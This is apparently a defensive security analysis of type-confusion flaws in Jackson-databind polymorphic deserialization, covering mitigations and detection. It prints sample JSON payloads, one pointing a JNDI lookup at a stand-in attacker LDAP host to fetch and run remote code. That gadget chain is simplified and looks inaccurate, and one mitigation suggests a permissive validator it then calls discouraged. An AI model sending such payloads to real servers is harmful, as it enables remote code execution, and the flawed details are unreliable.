## Deep Dive Analysis: Type Confusion Vulnerabilities in Polymorphic Deserialization (Jackson-databind)

**Introduction:**

As a cybersecurity expert collaborating with the development team, I've conducted a deep analysis of the "Type Confusion Vulnerabilities in Polymorphic Deserialization" attack surface within our application, specifically concerning its use of the `jackson-databind` library. This analysis aims to provide a comprehensive understanding of the vulnerability, its potential impact, and actionable mitigation strategies.

**Understanding the Attack Surface:**

The core of this vulnerability lies in the inherent flexibility of `jackson-databind`'s polymorphic deserialization feature. This feature allows an application to deserialize JSON data into different Java object types based on type information embedded within the JSON payload. While powerful for handling diverse data structures, it introduces a critical attack surface if not carefully managed.

**How Jackson-databind Facilitates the Vulnerability:**

`jackson-databind` offers several mechanisms for handling polymorphic deserialization, each with its own security implications:

* **Default Typing (Enabled Globally or Per-Property):**  This is the most dangerous configuration. When enabled, Jackson automatically includes type information (`@class`) in the serialized JSON and uses it during deserialization. This gives attackers direct control over the instantiated class.
* **Logical Type Names with `@JsonTypeInfo` and `@JsonSubTypes`:** This approach is generally safer as it requires explicit mapping of logical type names to concrete classes. However, vulnerabilities can arise if:
    * The set of allowed subtypes is not exhaustive or is easily guessable.
    * The application logic doesn't properly handle all possible subtypes.
* **Custom Deserializers:** While offering the most control, custom deserializers can still be vulnerable if they don't thoroughly validate the incoming type information and handle potential discrepancies.
* **No Type Information:** In scenarios where no explicit type information is present, Jackson might attempt to infer the type, which can lead to unexpected behavior if the input data is crafted maliciously.

**Deep Dive into the Exploitation Mechanism:**

The attacker's goal is to manipulate the type information in the JSON payload to force the application to instantiate an object of a class different from what is expected. This "type confusion" can be exploited in several ways:

1. **Instantiation of Unexpected Benign Classes:** Even if the attacker doesn't target a known RCE gadget, instantiating an unexpected class can disrupt application logic. For example, if the application expects a `Payment` object with specific validation rules, but the attacker forces the instantiation of a simpler `Transaction` object, these validations might be bypassed.

2. **Instantiation of Gadget Classes for Remote Code Execution (RCE):** This is the most severe scenario. `jackson-databind` has been historically vulnerable to "gadget chain" attacks. Attackers can leverage known classes within the application's classpath (or dependencies) that, when their properties are set in a specific way, trigger a chain of method calls leading to arbitrary code execution. By controlling the instantiated type and its properties, attackers can trigger these gadget chains.

3. **Denial of Service (DoS):**  Instantiating objects that consume significant resources or trigger infinite loops can lead to a denial-of-service attack.

4. **Data Corruption:**  If the unexpected object has different fields or data structures than expected, the application's subsequent processing of this object can lead to data corruption or inconsistencies.

**Concrete Example Scenario:**

Let's expand on the provided example:

Imagine an online ordering system where the application expects to deserialize a `ShippingAddress` object.

```java
// Expected Class
public class ShippingAddress {
    private String street;
    private String city;
    private String zipCode;

    // Getters and setters
}
```

Now, consider a malicious attacker crafting the following JSON payload:

```json
{
  "@class": "java.net.URL",
  "authority": "malicious.attacker.com"
}
```

If default typing is enabled or there's a vulnerability in the type handling, `jackson-databind` might instantiate a `java.net.URL` object instead of `ShippingAddress`. While seemingly harmless, if the application later attempts to access fields specific to `ShippingAddress` (like `street` or `city`), it will result in errors or unexpected behavior.

**More Dangerous Scenario (RCE):**

Using a known gadget class, an attacker could craft a payload like this (simplified example, actual gadgets are more complex):

```json
{
  "@class": "org.springframework.aop.support.AdvisedSupport",
  "advice": {
    "@class": "org.springframework.jndi.JndiObjectFactoryBean",
    "jndiName": "ldap://malicious.attacker.com/Exploit"
  },
  "targetSource": {
    "@class": "org.springframework.aop.target.SingletonTargetSource",
    "target": {}
  },
  "exposeProxy": true
}
```

This payload attempts to instantiate an `AdvisedSupport` object from the Spring Framework (if present in the classpath) and configure it to fetch and execute code from a malicious LDAP server.

**Impact Assessment:**

As highlighted in the initial description, the impact of this vulnerability is **High**. Successful exploitation can lead to:

* **Remote Code Execution (RCE):** Complete control over the server.
* **Data Corruption:** Inconsistent or invalid data within the application.
* **Denial of Service (DoS):** Application unavailability.
* **Information Disclosure:** Access to sensitive data.
* **Unexpected Application Behavior:** Errors, crashes, and incorrect functionality.

**Risk Severity:**

The **High** risk severity is justified due to the potential for severe consequences, particularly the possibility of RCE. The widespread use of `jackson-databind` makes this a common and critical vulnerability.

**Detailed Analysis of Mitigation Strategies:**

Let's delve deeper into the recommended mitigation strategies:

1. **Avoid Using Default Typing for Polymorphic Deserialization Without Strict Controls:**

   * **Problem:** Default typing (`ObjectMapper.enableDefaultTyping()`) automatically includes type information, giving attackers direct control.
   * **Solution:**  Disable default typing globally. If absolutely necessary for specific scenarios, use `ObjectMapper.enableDefaultTyping(LaissezFaireSubTypeValidator.instance, ObjectMapper.DefaultTyping.NON_FINAL)` with extreme caution and only for non-critical data. `LaissezFaireSubTypeValidator` is generally discouraged due to its lack of restrictions.
   * **Best Practice:**  Favor explicit type handling mechanisms.

2. **Implement Custom Deserializers with Robust Validation of the Incoming Type Information:**

   * **Mechanism:** Create custom `JsonDeserializer` classes for polymorphic types.
   * **Implementation:** Within the deserializer, inspect the incoming type information (e.g., using `@type` or a custom field). Implement strict validation logic to ensure the provided type is expected and safe. Throw exceptions for invalid types.
   * **Benefits:** Provides fine-grained control and allows for custom security checks.
   * **Considerations:** Requires more development effort and careful maintenance.

3. **Use `@JsonTypeInfo` and `@JsonSubTypes` Annotations to Explicitly Define the Allowed Subtypes:**

   * **Mechanism:** Annotate the base class or interface with `@JsonTypeInfo` to specify how type information is included (e.g., using a property like `@type`). Use `@JsonSubTypes` to list the explicitly allowed concrete subtypes.
   * **Implementation:**
     ```java
     @JsonTypeInfo(use = JsonTypeInfo.Id.NAME, include = JsonTypeInfo.As.PROPERTY, property = "@type")
     @JsonSubTypes({
             @JsonSubTypes.Type(value = Dog.class, name = "dog"),
             @JsonSubTypes.Type(value = Cat.class, name = "cat")
     })
     public abstract class Animal {
         // ...
     }

     public class Dog extends Animal { /* ... */ }
     public class Cat extends Animal { /* ... */ }
     ```
   * **Benefits:** Restricts deserialization to a predefined set of safe types.
   * **Limitations:** Requires knowing all possible subtypes at compile time.

4. **Employ a `PolymorphicTypeValidator` to Enforce Allowed Base Types and Subtypes:**

   * **Mechanism:** Introduced in Jackson 2.10, `PolymorphicTypeValidator` provides a centralized mechanism to define allowed base types and their permissible subtypes.
   * **Implementation:** Create a custom `PolymorphicTypeValidator` or use built-in implementations like `BasicPolymorphicTypeValidator.builder()` to define allowed type mappings. Register this validator with the `ObjectMapper`.
   * **Benefits:** More flexible than `@JsonSubTypes`, allowing for more complex validation rules and dynamic updates.
   * **Example:**
     ```java
     BasicPolymorphicTypeValidator ptv = BasicPolymorphicTypeValidator.builder()
             .allowIfBaseType(Animal.class)
             .allowIfSubType(Dog.class)
             .allowIfSubType(Cat.class)
             .build();

     ObjectMapper mapper = new ObjectMapper();
     mapper.setPolymorphicTypeValidator(ptv);
     ```

**Additional Best Practices:**

* **Principle of Least Privilege:** Only deserialize data into the most specific type necessary. Avoid deserializing into overly generic base classes if possible.
* **Input Validation:** Implement robust input validation on all incoming data, including the type information.
* **Dependency Management:** Keep `jackson-databind` and all other dependencies up-to-date to benefit from security patches.
* **Security Audits and Code Reviews:** Regularly review code that handles deserialization, paying close attention to polymorphic type handling. Use static analysis tools to identify potential vulnerabilities.
* **Consider Alternative Serialization Libraries:** If the complexity and risk associated with `jackson-databind`'s polymorphic deserialization are too high, consider alternative libraries with simpler or more secure approaches.

**Detection Strategies:**

How can we identify if our application is vulnerable to this attack?

* **Code Review:** Manually inspect code for usage of `ObjectMapper.enableDefaultTyping()` or scenarios where polymorphic deserialization is used without explicit type control.
* **Static Analysis Tools:** Utilize static analysis tools specifically designed to detect security vulnerabilities in Java code, including those related to `jackson-databind`. Look for rules related to default typing and missing type validation.
* **Dynamic Testing (Penetration Testing):** Conduct penetration testing with a focus on manipulating JSON payloads to inject unexpected types. Attempt to trigger known gadget chains if dependencies are present.
* **Dependency Scanning:** Use tools to scan dependencies for known vulnerabilities in `jackson-databind` versions.

**Conclusion:**

Type confusion vulnerabilities in polymorphic deserialization within `jackson-databind` represent a significant security risk. Understanding the underlying mechanisms and implementing robust mitigation strategies is crucial for protecting our application. By prioritizing explicit type handling, leveraging `PolymorphicTypeValidator`, and adhering to security best practices, we can significantly reduce our attack surface and prevent potential exploitation. Continuous vigilance through code reviews, security audits, and dependency management is essential to maintain a secure application. This deep analysis provides a solid foundation for the development team to address this critical vulnerability effectively.
